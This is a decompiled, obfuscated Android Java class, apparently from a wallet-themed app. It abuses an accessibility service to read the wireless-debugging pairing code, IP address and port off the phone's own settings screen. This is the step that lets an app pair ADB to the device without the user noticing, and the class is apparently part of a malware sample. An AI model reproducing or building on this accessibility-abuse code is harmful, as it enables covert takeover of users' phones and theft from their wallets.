package com.guard.wallet.thread;

import a1.q;
import android.os.Build.VERSION;
import android.util.Log;
import com.guard.wallet.entity.PairPortAndCodeResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Objects;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import o.a0;

public final class h implements Callable {
   public final a0 a;
   public final AtomicReference b = new AtomicReference(null);
   public final AtomicInteger c = new AtomicInteger(0);
   public final AtomicReference d = new AtomicReference(null);

   public h(a0 var1) {
      this.a = var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final Object call() {
      AtomicReference var7 = this.d;
      Object var5 = null;
      var7.set(null);
      AtomicInteger var6 = this.c;
      var6.set(0);
      int var1 = 0;

      AtomicReference var8;
      while (true) {
         var8 = this.b;
         int var3 = 1;
         if (var1 < 30) {
            a0 var9 = this.a;
            if (var9.M()) {
               int var2 = var1;

               label335: {
                  label334: {
                     Exception var10000;
                     label346: {
                        try {
                           Log.d("ReadPairCodeCallable", "开始读取配对码");
                        } catch (Exception var34) {
                           var10000 = var34;
                           boolean var10001 = false;
                           break label346;
                        }

                        var2 = var1;

                        UiObjectCollection var4;
                        label331: {
                           label347: {
                              try {
                                 if (var9.k() == null) {
                                    break label347;
                                 }
                              } catch (Exception var49) {
                                 var10000 = var49;
                                 boolean var56 = false;
                                 break label346;
                              }

                              var2 = var1;

                              try {
                                 var4 = var9.k().findByClassName("android.widget.TextView");
                                 break label331;
                              } catch (Exception var33) {
                                 var10000 = var33;
                                 boolean var57 = false;
                                 break label346;
                              }
                           }

                           var4 = null;
                        }

                        label324:
                        if (var4 != null) {
                           var2 = var1;

                           try {
                              if (var4.size() <= 0) {
                                 break label324;
                              }
                           } catch (Exception var48) {
                              var10000 = var48;
                              boolean var58 = false;
                              break label346;
                           }

                           var2 = var1;

                           try {
                              var52 = var4.getNodes().iterator();
                           } catch (Exception var32) {
                              var10000 = var32;
                              boolean var59 = false;
                              break label346;
                           }

                           while (true) {
                              var2 = var1;

                              try {
                                 if (!var52.hasNext()) {
                                    break;
                                 }
                              } catch (Exception var36) {
                                 var10000 = var36;
                                 boolean var60 = false;
                                 break label346;
                              }

                              var2 = var1;

                              UiObject var11;
                              try {
                                 var11 = (UiObject)var52.next();
                              } catch (Exception var31) {
                                 var10000 = var31;
                                 boolean var61 = false;
                                 break label346;
                              }

                              if (var11 != null) {
                                 var2 = var1;

                                 try {
                                    if (q.B(var11.text())) {
                                       continue;
                                    }
                                 } catch (Exception var47) {
                                    var10000 = var47;
                                    boolean var62 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 String var12;
                                 try {
                                    var12 = var11.text();
                                 } catch (Exception var30) {
                                    var10000 = var30;
                                    boolean var63 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    if (Objects.equals(var12, "与设备配对")) {
                                       continue;
                                    }
                                 } catch (Exception var46) {
                                    var10000 = var46;
                                    boolean var64 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    if (Objects.equals(var12, "WLAN 配对码")) {
                                       continue;
                                    }
                                 } catch (Exception var45) {
                                    var10000 = var45;
                                    boolean var65 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    if (Objects.equals(var12, "IP 地址和端口")) {
                                       continue;
                                    }
                                 } catch (Exception var44) {
                                    var10000 = var44;
                                    boolean var66 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 StringBuilder var10;
                                 try {
                                    var10 = new StringBuilder();
                                 } catch (Exception var29) {
                                    var10000 = var29;
                                    boolean var67 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    // [VF-FIX] var10./* $VF: Unable to resugar constructor */<init>();
                                 } catch (Exception var28) {
                                    var10000 = var28;
                                    boolean var68 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    var10.append("读取配对码:");
                                 } catch (Exception var27) {
                                    var10000 = var27;
                                    boolean var69 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    var10.append(var12);
                                 } catch (Exception var26) {
                                    var10000 = var26;
                                    boolean var70 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    Log.d("ReadPairCodeCallable", var10.toString());
                                 } catch (Exception var25) {
                                    var10000 = var25;
                                    boolean var71 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    var55 = var11.text().split(":");
                                 } catch (Exception var24) {
                                    var10000 = var24;
                                    boolean var72 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 label351: {
                                    try {
                                       if (var55.length != 2) {
                                          break label351;
                                       }
                                    } catch (Exception var43) {
                                       var10000 = var43;
                                       boolean var73 = false;
                                       break label346;
                                    }

                                    var2 = var1;

                                    try {
                                       if (!q.D(var55[1])) {
                                          break label351;
                                       }
                                    } catch (Exception var42) {
                                       var10000 = var42;
                                       boolean var74 = false;
                                       break label346;
                                    }

                                    var2 = var1;

                                    try {
                                       if (var6.get() > 0) {
                                          break label351;
                                       }
                                    } catch (Exception var41) {
                                       var10000 = var41;
                                       boolean var75 = false;
                                       break label346;
                                    }

                                    var2 = var1;

                                    try {
                                       var8.set(var55[0]);
                                    } catch (Exception var23) {
                                       var10000 = var23;
                                       boolean var76 = false;
                                       break label346;
                                    }

                                    var2 = var1;

                                    try {
                                       var6.set(Integer.parseInt(var55[1]));
                                    } catch (Exception var22) {
                                       var10000 = var22;
                                       boolean var77 = false;
                                       break label346;
                                    }
                                 }

                                 var2 = var1;

                                 label352: {
                                    try {
                                       if (var55.length != 1) {
                                          break label352;
                                       }
                                    } catch (Exception var40) {
                                       var10000 = var40;
                                       boolean var78 = false;
                                       break label346;
                                    }

                                    var2 = var1;

                                    try {
                                       if (!q.D(var55[0])) {
                                          break label352;
                                       }
                                    } catch (Exception var39) {
                                       var10000 = var39;
                                       boolean var79 = false;
                                       break label346;
                                    }

                                    var2 = var1;

                                    try {
                                       if (!q.B(var7.get())) {
                                          break label352;
                                       }
                                    } catch (Exception var38) {
                                       var10000 = var38;
                                       boolean var80 = false;
                                       break label346;
                                    }

                                    var2 = var1;

                                    try {
                                       var7.set(q.Q(var55[0]));
                                    } catch (Exception var21) {
                                       var10000 = var21;
                                       boolean var81 = false;
                                       break label346;
                                    }
                                 }

                                 var2 = var1;

                                 try {
                                    if (q.B(var7.get())) {
                                       continue;
                                    }
                                 } catch (Exception var37) {
                                    var10000 = var37;
                                    boolean var82 = false;
                                    break label346;
                                 }

                                 var2 = var1;

                                 try {
                                    if (var6.get() > 0) {
                                       break label335;
                                    }
                                 } catch (Exception var20) {
                                    var10000 = var20;
                                    boolean var83 = false;
                                    break label346;
                                 }
                              }
                           }
                        }

                        var2 = var1;

                        label353: {
                           try {
                              if (q.B(var7.get())) {
                                 break label353;
                              }
                           } catch (Exception var35) {
                              var10000 = var35;
                              boolean var84 = false;
                              break label346;
                           }

                           var2 = var1;

                           try {
                              if (var6.get() > 0) {
                                 break label334;
                              }
                           } catch (Exception var19) {
                              var10000 = var19;
                              boolean var85 = false;
                              break label346;
                           }
                        }

                        var2 = var1;

                        try {
                           Log.e("ReadPairCodeCallable", "未读取到配对码读取配对码");
                        } catch (Exception var18) {
                           var10000 = var18;
                           boolean var86 = false;
                           break label346;
                        }

                        var3 = var1 + 1;
                        var2 = var3;

                        try {
                           com.guard.wallet.utils.g.T0(1);
                        } catch (Exception var17) {
                           var10000 = var17;
                           boolean var87 = false;
                           break label346;
                        }

                        var1 = var3;
                        var2 = var3;

                        try {
                           if (MyAccessibilityService.P() == null) {
                              continue;
                           }
                        } catch (Exception var16) {
                           var10000 = var16;
                           boolean var88 = false;
                           break label346;
                        }

                        var2 = var3;

                        label354: {
                           try {
                              if (VERSION.SDK_INT >= 33) {
                                 break label354;
                              }
                           } catch (Exception var15) {
                              var10000 = var15;
                              boolean var89 = false;
                              break label346;
                           }

                           var2 = var3;

                           try {
                              var9.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                           } catch (Exception var14) {
                              var10000 = var14;
                              boolean var90 = false;
                              break label346;
                           }

                           var1 = var3;
                           continue;
                        }

                        var2 = var3;

                        try {
                           MyAccessibilityService.I(var9.k());
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var91 = false;
                           break label346;
                        }

                        var1 = var3;
                        continue;
                     }

                     Exception var54 = var10000;
                     q.s("ReadPairCodeCallable", var54);
                     var1 = var2;
                     continue;
                  }

                  var50 = (boolean)var3;
                  break;
               }

               var50 = (boolean)var3;
               break;
            }
         }

         var50 = true ^ q.B(var7.get());
         break;
      }

      PairPortAndCodeResult var53 = (PairPortAndCodeResult)var5;
      if (var50) {
         var53 = new PairPortAndCodeResult((String)var8.get(), var6.get(), (String)var7.get());
      }

      return var53;
   }
}
